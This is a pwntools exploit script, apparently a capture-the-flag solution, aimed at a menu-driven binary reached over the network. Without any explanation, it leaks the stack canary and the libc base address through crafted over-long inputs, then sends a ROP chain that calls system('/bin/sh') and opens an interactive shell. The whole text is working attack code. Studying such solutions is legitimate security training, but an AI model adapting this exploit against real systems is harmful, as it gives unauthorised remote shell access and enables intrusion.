from pwn import *
context.terminal = 'tmux splitw -h'.split()
context.log_level='debug'
context.arch='amd64'
#p = process('./a.out')
p=remote('172.17.0.2', 1337)
libc = ELF('./libc.so.6', checksec=False)
choose = lambda x: p.sendlineafter(b'>> ', f'{x}'.encode())

for _ in range(3):
    choose(1)
    p.sendlineafter(b'\n', b'a'*127)
    choose(2)

choose(1)
p.sendlineafter(b'\n', b'a\x00'.ljust(128*5+1, b'a'))
choose(2)
choose(1)
p.sendlineafter(b'\n', b'aa')
choose(2)
pause()
choose(3)
p.sendlineafter(b'\n', b'4')
p.recvuntil(b'a'*(128*4+1))
canary = b'\0'+p.recv(7)
success(canary.hex())

choose(1)
p.sendlineafter(b'\n', b'a\x00'.ljust(128*3+0x40, b'a'))
choose(2)
choose(1)
p.sendlineafter(b'\n', b'aa')
choose(2)
pause()
choose(3)
p.sendlineafter(b'\n', b'6')
p.recvuntil(b'a'*(128*2+0x40))
libc.address = u64(p.recv(6)+b'\0\0')-0x2a578
success(hex(libc.address))

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
ropchain = flat([
    pop_rdi,
    binsh,
    pop_rdi+1,
    libc.sym['system']
])

choose(1)
p.sendlineafter(b'\n', b'a\x00'.ljust(128, b'a')+canary+b'a'*0x38+ropchain)
choose(2)

choose(114)
p.interactive()
